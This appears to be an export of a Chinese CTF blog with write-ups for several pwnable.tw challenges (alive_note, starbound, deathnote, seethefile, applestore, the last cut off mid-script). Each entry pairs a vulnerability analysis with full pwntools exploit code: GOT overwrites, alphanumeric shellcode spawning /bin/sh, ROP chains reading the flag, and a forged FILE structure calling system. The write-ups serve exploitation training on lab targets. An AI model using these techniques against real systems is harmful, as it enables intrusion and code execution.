    <content type="text"><![CDATA[突然发现已经两个月没写过WP了，愧疚- -… 此题也算一道分数很高的题目，主要考察Shellcode的编写。 题目功能又是一道题目逻辑很简单的题。 首先提供了三个函数 查看，删除，添加 查看函数： 此函数中readint()使用atoi进行解析，没有检查小于0的情况，造成越解读，可以泄露libc地址（然并卵） 添加函数中一样有这个问题，并且可以任意写， 显然是一道覆盖got表的题，并且没有开启NX保护，就是可以写shellcode。 查看一下check函数 不太清楚__ctype_b_loc是什么check，不过可以fuzz一下。 发现只有如下这些是可以输入的 12345678910'''0x0 0x20 0x30 0x31 0x32 0x33 0x34 0x35 0x36 0x37 0x38 0x39 0x41 0x42 0x430x44 0x45 0x46 0x47 0x48 0x49 0x4a 0x4b 0x4c 0x4d 0x4e 0x4f 0x50 0x51 0x520x53 0x54 0x55 0x56 0x57 0x58 0x59 0x5a 0x61 0x62 0x63 0x64 0x65 0x66 0x670x68 0x69 0x6a 0x6b 0x6c 0x6d 0x6e 0x6f 0x70 0x71 0x72 0x73 0x74 0x75 0x760x77 0x78 0x79 0x7a \x00 0 1 2 3 4 5 6 7 8 9 A B C D E F G H I J K L M N O P Q RS T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z''' 而这些机器码构成的汇编就可以做很多事情了，比如参考这个文档给出的汇编指令对应关系 https://wenku.baidu.com/view/bf5227ecaeaad1f346933f86.html 漏洞利用作为其他的限制，shellcode每块不许超过8字节，并且使用strdup建立堆块，也就是说不能有\x00。 根据堆的分配机制，每个堆块分配的大小应该是16字节，并且是连续的，因此可以shellcode链的方法进行跳转，比如使用JNE语句等。 选择覆盖的函数使用free函数，在delete函数时触发，原因是此时在寄存器里会有堆块相关的值。 此时调用free函数时，寄存器的值为： 12345678910111213141516eax 0x811f018 0x811f018 ；堆块地址ecx 0x0 0x0edx 0x0 0x0ebx 0x0 0x0esp 0xffd9597c 0xffd9597cebp 0xffd959a8 0xffd959a8esi 0xf76b7000 0xf76b7000edi 0xf76b7000 0xf76b7000eip 0x80484e0 0x80484e0 &lt;free@plt&gt;eflags 0x296 [ PF AF SF IF ]cs 0x23 0x23ss 0x2b 0x2bds 0x2b 0x2bes 0x2b 0x2bfs 0x0 0x0gs 0x63 0x63 以此寄存器的值构造shellcode，shellcode块之间使用3个小块填充即可 12345678910111213141516171819202122232425'''read(0,heap,size)shellcode 1push eax ;P eax=heappop ecx ;Y push ebx ;Spop eax ;Xpush 0x7a ;jzjnz 0x38 ;u8eax = 0 ebx = 0 ecx = heap edx = 0shellcode 2 pop edx ;Zdec eax ;Hxor byte ptr[ecx+0x46],al ;0a5jnz 0x39shellcode 3xor al,0x33 ;4cxor byte ptr[ecx+0x47],al ;0a5jnz 0x39shellcode 4push 0x33 ;j3pop eax ;Xxor al,0x30 ;40'''+'2L' #EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182from pwn import *debug = 0bad=[]other=[]good = []elf = ELF('./alive_note')context.log_level = 'debug'if debug: p = process('./alive_note') #$libc = ELF('/lib/i386-linux-gnu/libc.so.6') #off = 0x001b2000 context.log_level = 'debug' #gdb.attach(p,'b *0x80488d3') #gdb.attach(p,'b *0x80488C9')else: p = remote('chall.pwnable.tw', 10300) #libc = ELF('./libc_32.so.6')def test(): for i in range(256): p=process('./alive_note') p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Index') p.sendline('1') p.recvuntil('Name :') p.sendline(''+chr(i)) try: res = p.recvline() if('Done' in res): good.append(i) elif ('must be ' in res ): bad.append(i) else: other.append(i) except: bad.append(i) p.close()def add(num,name): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Index :') p.sendline(str(num)) p.recvuntil('Name :') p.sendline(name)def show(num): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('Index :') p.sendline(str(num))def delete(num): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('Index :') p.sendline(str(num))def padding(): add(9,'p4nda') add(9,'p4nda') add(9,'p4nda')shellcode1 = '''push eax pop ecx push ebx pop eax push 0x7a '''shellcode2 = '''pop edx dec eax xor byte ptr[ecx+0x45],al'''shellcode3='''xor al,0x33 xor byte ptr[ecx+0x46],al '''shellcode4='''push 0x33 pop eax xor al,0x30 '''print asm(shellcode1)if __name__ == '__main__': note = 0x804a080 add((elf.got['free']-note)/4,asm(shellcode1)+'u8') padding() add(0,asm(shellcode2)+'u9') padding() add(1,asm(shellcode3)+'u9') padding() add(2,asm(shellcode4)+'2L') padding() #gdb.attach(p,'b *0x80488ea') #add(1,'PPPPPPP') delete(1) p.sendline('\x90'*0x48+asm(shellcraft.sh())) p.interactive()'''read(0,heap,size)shellcode 1push eax ;P eax=heappop ecx ;Y push ebx ;Spop eax ;Xpush 0x7a ;jzjnz 0x38 ;u8eax = 0 ebx = 0 ecx = heap edx = 0shellcode 2 pop edx ;Zdec eax ;Hxor byte ptr[ecx+0x46],al ;0a5jnz 0x39shellcode 3xor al,0x33 ;4cxor byte ptr[ecx+0x47],al ;0a5jnz 0x39shellcode 4push 0x33 ;j3pop eax ;Xxor al,0x30 ;40''''''eax 0x811f018 0x811f018ecx 0x0 0x0edx 0x0 0x0ebx 0x0 0x0esp 0xffd9597c 0xffd9597cebp 0xffd959a8 0xffd959a8esi 0xf76b7000 0xf76b7000edi 0xf76b7000 0xf76b7000eip 0x80484e0 0x80484e0 &lt;free@plt&gt;eflags 0x296 [ PF AF SF IF ]cs 0x23 0x23ss 0x2b 0x2bds 0x2b 0x2bes 0x2b 0x2bfs 0x0 0x0gs 0x63 0x63'''''' test() print 'good:',good print 'bad:',bad print 'other:',other for i in good: print hex(i),''' '''0x0 0x20 0x30 0x31 0x32 0x33 0x34 0x35 0x36 0x37 0x38 0x39 0x41 0x42 0x43 0x44 0x45 0x46 0x47 0x48 0x49 0x4a 0x4b 0x4c 0x4d 0x4e 0x4f 0x50 0x51 0x52 0x53 0x54 0x55 0x56 0x57 0x58 0x59 0x5a 0x61 0x62 0x63 0x64 0x65 0x66 0x67 0x68 0x69 0x6a 0x6b 0x6c 0x6d 0x6e 0x6f 0x70 0x71 0x72 0x73 0x74 0x75 0x76 0x77 0x78 0x79 0x7a\x00 0 1 2 3 4 5 6 7 8 9 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z''']]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
        <tag>PWNABLE.TW</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PWNABLE.TW】 starbound 解题思路]]></title>
    <url>%2F2017%2F10%2F13%2Fpwnable-tw-starbound%2F</url>
    <content type="text"><![CDATA[题目功能此题的代码量很大，看了一整天的逻辑代码，没发现什么问题… 整个函数的逻辑主要是红框中两个指针的循环赋值和调用，其中第一个指针是主功能函数，第二个数组是子功能函数。 函数的漏洞主要在main函数中，main函数中使用了strtol函数将用户输入转换为字符串，并根据此转换结果，对子函数进行访问。 当用户输入过大或过小时，会导致越界访问的问题，其中，strtol函数的返回值可能为负数。 bss段中，用户输入的名称最开始是随机生成的，但用户可以更改。而此字段在函数指针数组上面，也就是说，用户可以通过控制名称的方式获得一次指令执行的机会 漏洞利用查看一下安全保护机制 可以使用ROP的方式来利用漏洞。由于main函数中用户可以输入0x100长的字符给v5，因此，v5可作为ROP的存放位置，在name中找到一个gadget使得EIP跳转到位于栈上v5字段内即可。 由于此题没有附带libc，也没找到可以泄露地址的漏洞，因此在ROP中使用了在plt区域有的open、read、puts函数来打印flag，其中从dalao那里get的知识点是，read函数的第一个参数是一个int类型的值， 用于标识文件身份，其中0 ： stdin、1：stdout、2：stderr，本题内没有打开未关闭的文件，因此read(3,&amp;buf,0x10)完全可以读出flag。 另外，恰巧在最近接触到了return to dl-resolve的原理：http://www.freebuf.com/articles/system/149214.html 此题恰巧也符合使用该技术的先决条件，但貌似ld.so做了保护，没有成功，在网上没有找到相关的保护手段，通过调试发现ld.so以偏移量获取了程序.gnu.version的内容，进一步运算，但我构造的偏移量过大， 导致运算超出了可读写的范围，造成程序崩溃。暂未找到其他方法，此坑以后再填。 暂存未成功的return-to-dl-resolve代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *debug = 1context(arch='i386',os='linux',endian='little')context.log_level='debug' elf = ELF('./starbound')if debug: p=process('./starbound') file = '~/Desktop/pwn/tw/starbound/flag'else: p=remote('chall.pwnable.tw',10202)file = '/home/starbound/flag\0\0\0\0'file = '/bin/sh\0' + '\0'*(len(file)-len('/bin/sh\0'))gadget = 0x08048e48bss_function = 0x08058150bss_name = 0x080580D0shellcode = file + p32(gadget) + p32(0x0805509c) + p32(0x00002807) + 'a'*8 print '[*] shellcode len ',len(shellcode)print '[*] ',hex(bss_name + len(shellcode) - 0x80481dc)shellcode = file + p32(gadget) + p32(0x0805509c) + p32(0x00002807) + 'a'*8 + p32(0xe1)+p32(0)+p32(0)+p32(0x12) distance3 = bss_name + len(shellcode) - 0x80484fcprint '[*] ',hex(distance3)shellcode = file + p32(gadget) + p32(0x0805509c) + p32(0x000ff207) + 'a'*8 + p32(distance3)+p32(0)+p32(0)+p32(0x12) + 'system\x00'shellcode = file + p32(gadget) + p32(0x0805509c) + p32(0x00002807) + 'a'*8 + p32(0xe1)+p32(0)+p32(0)+p32(0x12) p.recvuntil('&gt; ')p.send('6')p.recvuntil('&gt; ')p.send('2')p.recvuntil(': ')p.sendline(shellcode)p.recvuntil('&gt; ')distance = (bss_name + len(file) - bss_function)/4#print str(distance) gdb.attach(p,'b *0x0804A65D')distance2 = bss_name + len(file) + 4 - 0x80487c8cat_flag_exp = str(distance-1) + '\0' + 'a'*4 + p32(0x8048940) + p32(distance2) + p32(0xdeadbeef) + p32(bss_name)'''+ p32(elf.symbols['open']) + p32(gadget) + p32(bss_name) \+ p32(0)+ 'a'*(0x1c-8) + p32(elf.symbols['read']) + p32(gadget) + p32(3) + p32(bss_name+20) + p32(0x40) +'a'*(0x1c-12) + p32(elf.symbols['puts']) + p32(0xdeadbeef) + p32(bss_name+20)''''''$ readelf -d starbound | grep JMPREL 0x00000017 (JMPREL) 0x80487c8gdb-peda$ x /2x 0x80487c8+0x1200x80488e8: 0x0805509c 0x00002807readelf -d starbound | grep SYM 0x00000006 (SYMTAB) 0x80481dc 0x0000000b (SYMENT) 16 (bytes) 0x6ffffff0 (VERSYM) 0x80486f2$ readelf -d starbound | grep STRTAB 0x00000005 (STRTAB) 0x80484fc'''p.sendline(cat_flag_exp)p.interactive()#0x08048e48 : add esp, 0x1c ; ret EXP1234567891011121314151617181920212223242526272829303132333435from pwn import *debug = 0context(arch='i386',os='linux',endian='little')context.log_level='debug' elf = ELF('./starbound')if debug: p=process('./starbound') file = '~/Desktop/pwn/tw/starbound/flag'else: p=remote('chall.pwnable.tw',10202)file = '/home/starbound/flag\0\0\0\0'gadget = 0x08048e48shellcode = file + p32(gadget) + 'a'*4p.recvuntil('&gt; ')p.send('6')p.recvuntil('&gt; ')p.send('2')p.recvuntil(': ')p.send(shellcode)p.recvuntil('&gt; ')bss_function = 0x08058150bss_name = 0x080580D0distance = (bss_name + len(file) - bss_function)/4#print str(distance) #gdb.attach(p,'b *0x0804A65D')cat_flag_exp = str(distance-1) + '\0' + 'a'*4 + p32(elf.symbols['open']) + p32(gadget) + p32(bss_name) \+ p32(0)+ 'a'*(0x1c-8) + p32(elf.symbols['read']) + p32(gadget) + p32(3) + p32(bss_name+20) + p32(0x40) +'a'*(0x1c-12) + p32(elf.symbols['puts']) + p32(0xdeadbeef) + p32(bss_name+20)p.sendline(cat_flag_exp)p.interactive()#0x08048e48 : add esp, 0x1c ; ret]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
        <tag>PWNABLE.TW</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PWNABLE.TW】 deathnote 解题思路]]></title>
    <url>%2F2017%2F09%2F29%2Fpwnable-tw-deathnote%2F</url>
    <content type="text"><![CDATA[一开始特别懵的一道题。 题目功能题目逻辑比较简单，大概增加和删除和打印三个功能： show函数中，打印各日记内容，由于这题没有给出libc文件，应该不需要泄露地址，估计用处不大： delete函数中，正常的free，然后指针修改为null，可能不存在漏洞，唯一的bug在于read_int()函数中 readint函数使用了atoi函数，当输入是“-12”这样的负数时，造成读越界，但是由于在delete函数中，用处不是特别大 最后，add函数 函数的逻辑是在note数组中写入malloc的返回的指针，并且同样用了readint函数，可以发现存在越界写的问题，而note变量在bss段上，可以想到覆写got表： 漏洞利用检查一下文件开启的保护，没有开启NX保护，也就是可以写入shellcode，这样put@got指向malloc返回地址，malloc块中写入shellcode，便可以获得shell。 而针对用户输入，还有一个函数用来检测， 因此需要保证用户输入范围是从2F~7F范围内。即考察shellcode的编写。 常见的shellcode思路是利用int 80h陷入软中断， 并使得eax内容为0x0b，ebx指向一个字符串”/bin/sh”，ecx、edx置0。如shellcraft.sh() 12345678910111213141516171819202122/* execve(path=&apos;/bin///sh&apos;, argv=[&apos;sh&apos;], envp=0) *//* push &apos;/bin///sh\x00&apos; */push 0x68push 0x732f2f2fpush 0x6e69622fmov ebx, esp/* push argument array [&apos;sh\x00&apos;] *//* push &apos;sh\x00\x00&apos; */push 0x1010101xor dword ptr [esp], 0x1016972xor ecx, ecxpush ecx /* null terminate */push 4pop ecxadd ecx, esppush ecx /* &apos;sh\x00&apos; */mov ecx, espxor edx, edx/* call execve() */push SYS_execve /* 0xb */pop eaxint 0x80 但在汇编以后，不能满足我们的要求。 根据某师傅博客中写到，此题可用的汇编指令如下: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768691.数据传送:push/pop eax…pusha/popa2.算术运算:inc/dec eax…sub al, 立即数sub byte ptr [eax… + 立即数], al dl…sub byte ptr [eax… + 立即数], ah dh…sub dword ptr [eax… + 立即数], esi edisub word ptr [eax… + 立即数], si disub al dl…, byte ptr [eax… + 立即数]sub ah dh…, byte ptr [eax… + 立即数]sub esi edi, dword ptr [eax… + 立即数]sub si di, word ptr [eax… + 立即数]3.逻辑运算:and al, 立即数and dword ptr [eax… + 立即数], esi ediand word ptr [eax… + 立即数], si diand ah dh…, byte ptr [ecx edx… + 立即数]and esi edi, dword ptr [eax… + 立即数]and si di, word ptr [eax… + 立即数]xor al, 立即数xor byte ptr [eax… + 立即数], al dl…xor byte ptr [eax… + 立即数], ah dh…xor dword ptr [eax… + 立即数], esi edixor word ptr [eax… + 立即数], si dixor al dl…, byte ptr [eax… + 立即数]xor ah dh…, byte ptr [eax… + 立即数]xor esi edi, dword ptr [eax… + 立即数]xor si di, word ptr [eax… + 立即数]4.比较指令:cmp al, 立即数cmp byte ptr [eax… + 立即数], al dl…cmp byte ptr [eax… + 立即数], ah dh…cmp dword ptr [eax… + 立即数], esi edicmp word ptr [eax… + 立即数], si dicmp al dl…, byte ptr [eax… + 立即数]cmp ah dh…, byte ptr [eax… + 立即数]cmp esi edi, dword ptr [eax… + 立即数]cmp si di, word ptr [eax… + 立即数]5.转移指令:push 56hpop eaxcmp al, 43hjnz lable&lt;=&gt; jmp lable6.交换al, ahpush eaxxor ah, byte ptr [esp] // ah ^= alxor byte ptr [esp], ah // al ^= ahxor ah, byte ptr [esp] // ah ^= alpop eax7.清零:push 44hpop eaxsub al, 44h ; eax = 0push esipush esppop eaxxor [eax], esi ; esi = 0 可以先看一下，执行shellcode时的寄存器状况： 根据如上的寄存器情况，shellcode可以写成这样： 12345678910111213141516171819202122232425262728293031323334shellcode = ''' /* execve(path='/bin///sh', argv=0, envp=0) */ /* push '/bin///sh\x00' */ push 0x68 push 0x732f2f2f push 0x6e69622f push esp pop ebx /*rewrite shellcode to get 'int 80'*/ push edx pop eax push 0x60606060 pop edx sub byte ptr[eax + 0x35] , dl sub byte ptr[eax + 0x35] , dl sub byte ptr[eax + 0x34] , dl push 0x3e3e3e3e pop edx sub byte ptr[eax + 0x34] , dl /*set zero to edx*/ push ecx pop edx /*set 0x0b to eax*/ push edx pop eax xor al, 0x40 xor al, 0x4b /*foo order,for holding the place*/ push edx pop edx push edx pop edx'''shellcode = asm(shellcode) + '\x6b\x40' EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from pwn import *debug = 1elf = ELF('./death_note')if debug: p = process('./death_note') context.log_level = 'debug' gdb.attach(p,'b *0x80487ef')else: p = remote('chall.pwnable.tw', 10201)def add(p,index,s): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Index :') p.sendline(index) p.recvuntil('Name :') p.sendline(s)bss = 0x804a060puts_got = elf.got['puts']print hex(puts_got)offset = (puts_got - bss)/4#'''shellcode = shellcraft.sh()print len(asm(shellcode))print hex(asm(shellcode))'''shellcode = ''' /* execve(path='/bin///sh', argv=['sh'], envp=0) */ /* push '/bin///sh\x00' */ push 0x68 push 0x732f2f2f push 0x6e69622f push esp pop ebx push edx pop eax push 0x60606060 pop edx sub byte ptr[eax + 0x35] , dl sub byte ptr[eax + 0x35] , dl sub byte ptr[eax + 0x34] , dl push 0x3e3e3e3e pop edx sub byte ptr[eax + 0x34] , dl push ecx pop edx push edx pop eax xor al, 0x40 xor al, 0x4b push edx pop edx push edx pop edx'''print hex(len(asm(shellcode)))shellcode = asm(shellcode) + '\x6b\x40'add(p,str(offset),shellcode)p.interactive()]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
        <tag>PWNABLE.TW</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PWNABLE.TW】 seethefile 解题思路]]></title>
    <url>%2F2017%2F09%2F20%2Fpwnable-tw-seethefile%2F</url>
    <content type="text"><![CDATA[题目功能main函数中一共4个功能，openfile、readfile、writefile、closefile。 其中，在最后退出时有一个明显的溢出，是scanf(“%s”,&amp;name); name位于bss段上，name下面有一个fp用于存储文件指针，可以被覆盖。 再看其他函数： openfile.只有一个简单的输入并打开，保存文件指针在bss段上的fp变量中： readfile,从fp所指的文件中每次读取0x18F字节字节到magicbuf中，这个变量也在bss段上。 writefile无法读取含有flag、FLAG、}的字符串，是一个打印函数 漏洞利用由于无法覆盖栈上内容，仅能覆盖bss段上空间，因此想法是覆盖fp指针，通过伪造fp指针进一步利用，这种利用方法在如下文章中已经给出： http://www.evil0x.com/posts/13764.html 另外一个重要的点在于libc的泄露。 由于linux独特的文件形式存储，文件的内存信息存储与/proc/pid/maps中，这里pid使用self来代替，如下图： 因此libc可以通过该方式泄露。 伪造file指针的过程，可以通过上面的链接中大致了解，最终的步骤是构造file对象的内容，由于最终要执行fclose(fp)，这一函数，而fclose中用户可控的函数指针执行位置在fclose如下位置， 因此必须要使fclose执行到该位置，其决定性作用的是前2个字节，可以通过动态调试来获得，将fclose(fp)，转化为system（fp），而fp的前两个字节有太重要的作用，建议不要动。 可以用’||/bin/sh’的方法执行获得shell。 至于前两个字节的调试，需要通过动态调试fclose的方法一步一步来找。 捷径的方法是用链接中给到用stderr内容来最初构建。 另外，题目中的输入方法是可以输入\x00的，算是个福利吧。 EXP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *debug = 0elf = ELF('./seethefile')if debug: p = process('./seethefile') libc = ELF('./libc.local.so') #off = 0x001b2000 context.log_level = 'debug' #gdb.attach(p)else: p = remote('chall.pwnable.tw', 10200) libc = ELF('./libc_32.so.6') #off = 0x001b0000p.recvuntil('Your choice :')p.sendline('1')p.recvuntil('What do you want to see :')p.sendline('/proc/self/maps')p.recvuntil('Your choice :')p.sendline('2')p.recvuntil('Your choice :')p.sendline('2')p.recvuntil('Your choice :')p.sendline('3')cache = p.recvuntil('Your choice :')cache_part = cache.split('\n')libc_start_addr = 0for i in cache_part: if 'libc' in i: libc_start_addr = int(i[0:8],16) breakif libc_start_addr == 0: print '[-] didnot find libc addr. exit' exit(0)system_libc = libc.symbols['system']system_libc_addr = libc_start_addr + system_libclog.success('find system:'+hex(system_libc_addr))p.sendline('5')p.recvuntil('Leave your name :')#gdb.attach(p,'b *0x8048b04')start =0x8048a37 # elf.symbols['puts']#fake_file_start = 0x804b280+0x4fake_file_jmp = fake_file_start + 180padding = 'p4nda'padding = padding.ljust(0x20,'!') + p32(fake_file_start)bin_sh = '||/bin/sh'start = system_libc_addrexp_back_main = '\x86\xb4\xad\xfb'+bin_sh+'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x60\x8d\x6b\xf7\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x64\x98\x6b\xf7\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x24\x84\x6b\xf7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'+p32(fake_file_jmp)+'\x00\x00\x00\x00\x00\x00\x00\x00'exp_back_main = exp_back_main.ljust(180,'b') print len(exp_back_main)exp_back_main+= p32(start)*15 + p32(start)*8p.sendline(padding + exp_back_main)p.recvuntil('see you next time')p.sendline('cd /home/seethefile/')p.sendline('./get_flag')p.recvuntil('magic :')p.sendline('Give me the flag\0')p.interactive()#backup#exp_back_main = '\x86\xb4\xad\xfb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x60\x8d\x6b\xf7\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x64\x98\x6b\xf7\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x24\x84\x6b\xf7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'+p32(fake_file_jmp)+'\x00\x00\x00\x00\x00\x00\x00\x00'#'\x00\x00\x00\x00\x00\x00\x00\x00\x00'#dustbin#exp_back_main = '\x86\x21\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x21\xba\xfb\xf7\x02AAAAAAA\xff\xff\xff\xffAA\x08A\x60\xb2\x04\x08\xff\xff\xff\xff\xff\xff\xff\xffAAAA\x60\xbb\xfb\xf7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x80\xaa\xfb\xf7AAAA'+p32(fake_file_jmp)#0804B260#exp_back_main = '\x86\x91\xad\xfb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x21\xba\x04\x08\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x60\xb2\x04\x08\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x60\xb2\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'+p32(fake_file_jmp)+'\x00\x00\x00\x00\x00\x00\x00\x00'#exp_back_main = p32(fake_file_start) * 0x11 + 'aa' + '\x04' + 'a' + p32(fake_file_jmp) * 0x13 + p32(fake_file_jmp) * 2]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
        <tag>PWNABLE.TW</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PWNABLE.TW】 applestore 解题思路]]></title>
    <url>%2F2017%2F09%2F14%2Fpwnable-tw-applestore%2F</url>
    <content type="text"><![CDATA[做到这道题的时候正赶上iPhone 8上市，撒花~（虽然不知道为啥） 题目功能先进到main函数，比较简单。 myCart位于bss段上，是一个长度为0x10。 主要的处理函数是handler函数： 这是一个标准的菜单类题目。挨个函数看下去 list： 这个是各种手机的价格，什么都没有。 再看第二个函数： 这个函数是一个添加购物车的函数，具体采用my_read函数，得到用户输入的商品号，然后用atoi函数进行判断。 my_read函数中存在一个问题，在read部分中以\0分割可以输入其他内容到栈上，并不影响运行结果，因为atoi函数是以\0为分割的。 再看create函数： 先malloc了一块空间，并返回，内容先不说。然后再看insert函数，首先在myCart上寻找，找到第3个字节为0的就将上面malloc的内存挂在上面。 当malloc、insert许多内存块后，大致就形成了链表。 delete函数 首先还是使用my_read函数，接受用户输入，根据输入判断删除的位置，进一步将被删除的内存块从链表中摘除，摘除的操作类似于smallbins的unlink操作。 cart函数，这是一个遍历链表并打印的过程，一遍来说，内存数据泄露都出现在这样的函数中。 checkout函数，这是一个结账函数，但是并不是真的结账，无论选择多少东西，函数都会告诉你下次结账吧。不过这里存在一个彩蛋，当选择商品的总价为7174时，会以1美元的价格在购物车里添加一台iPhone8. 漏洞分析位置就是在上面赠送的iPhone 8处，所谓的Free is the most expensive。 之前选择的商品都使用了malloc为商品创建了一块内存，但最后这个用了栈内的一块空间，距离ebp-2c个字节。 有了这点还不够，需要查看这块栈地址是否能被我们利用。 在其他函数中，距离ebp -0x20的位置都可以被用户自己修改。如， 以上位置，再加上my_read中的bug（上文提到的），就可以修改iPhone 8 内存块的任意结构了。 漏洞利用首先是7174价格的构造，简单的方法，所有的价格都以99结尾，然后价格以4结尾，总数应该是6台，所以尝试用19926 + 100 * 20 = 7174。即 6台 iPhone6 + 20台 iPhone 6s可以构造。 如此可以得到第27块是栈里的一块。 libc地址泄露在之前说过的，cart函数一般是地址泄露重要的突破点，这个也不例外，可以看到函数逻辑中，在打印部分是顺序遍历链表，若i+8不为空，就打印下一块的i，i+4部分： 前面构造的26块很正常，当第27块构造成如下结构时，即可泄露函数地址： 在用户输入时，别忘了buf是从-22开始的，即前面还有两个自己，这两个字节恰好填充为 “y\0” 如此便可泄露libc地址： 泄露堆地址仅仅泄露一个libc是不够的，还需要更多数据。 这个地址可以使用bss段上的myCart来泄露，因为bss端地址已知，其次myCart是链表头，具体可将内存块构造成如下这样： 同样，不要忘记前面的“y\0” 泄露stack地址上面可以得到第一块malloc得到堆的地址。一定有这样的疑惑，有了第一块堆的地址，通过计算26次malloc(0x10)就可以计算出第26块的地址，才利用上面的方法泄露，不就可以得出了第26块上 i+8的地址了吗？（栈上地址） 最开始就是这么写的，但是实际跑的时候发现并没有这样分配，没有特别多的规律，所以我采用了每次得到下一块堆块的地址，然后泄露其i+8内容，不断迭代得到最后的栈地址。 以上就得到了全部的地址。如果有人知道为啥堆分配不是顺次+ 0x18的请告诉我 仅仅泄露堆栈等地址貌似没什么用，必须找到可以篡改的地方。 Dword shoot DWORD SHOOT是堆漏洞的一个名词，意思是可以精确覆盖一个双字节地址的漏洞，常见的就是unlink漏洞。 上面说过，删除购物车里货物的方式类似于堆的unlink，因此存在的漏洞也类似于unlink的漏洞。 当我们修改第27块iPhone 8的后8字节时，对其进行删除就会有个DWORD SHOOT漏洞。 该漏洞如何利用呢？ 覆写一般的地址会有一个四字节的副作用产生，因此常见的利用方法是覆盖下两层函数的ebp，进一步控制esp，控制eip。 详细的原理可以参考之前我写的一篇关于pwnable.kr中的unlink题目： http://www.cnblogs.com/p4nda/p/7172104.html 利用思路是覆盖ebp，控制esp，控制eip，可参看这一篇：http://www.cnblogs.com/p4nda/p/7280520.html 第27块堆块的内容如下： 这次前面两位填写“27” 关键就在于如何构造stack_addr地址，必须找到一块我们可以覆写的内存，且在main函数结束之前不被破坏。这里我选择的在handler函数中的nptr块， 将其构造为： 由于会在main函数退出时执行system(‘/bin/sh’)，因此前两位填写“6\0”,使函数退出。 在这里还踩过一个坑在于使用子函数如cart内的nptr作为fake steak，但是不可以，有耐心的可以自行调一下为啥~ EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131from pwn import *debug = 0elf = ELF('./applestore')if debug: p = process('./applestore') libc = ELF('./libc.local.so') #off = 0x001b2000 context.log_level = 'debug' # gdb.attach(p)else: p = remote('chall.pwnable.tw', 10104) libc = ELF('./libc_32.so.6') #off = 0x001b0000for i in range(6): p.recvuntil("&gt;") p.sendline('2') p.recvuntil("Device Number&gt;") p.sendline('1')for i in range(20): p.recvuntil("&gt;") p.sendline('2') p.recvuntil("Device Number&gt;") p.sendline('2')p.recvuntil('&gt;')p.sendline('5')p.recvuntil('Let me check your cart. ok? (y/n) &gt;')p.sendline('y')if 'iPhone 8' in p.recvuntil('&gt;'): log.success('got iPhone 8')#leaklibcnum = 'y\0'read_got = elf.got['read']price = 0next_phone = 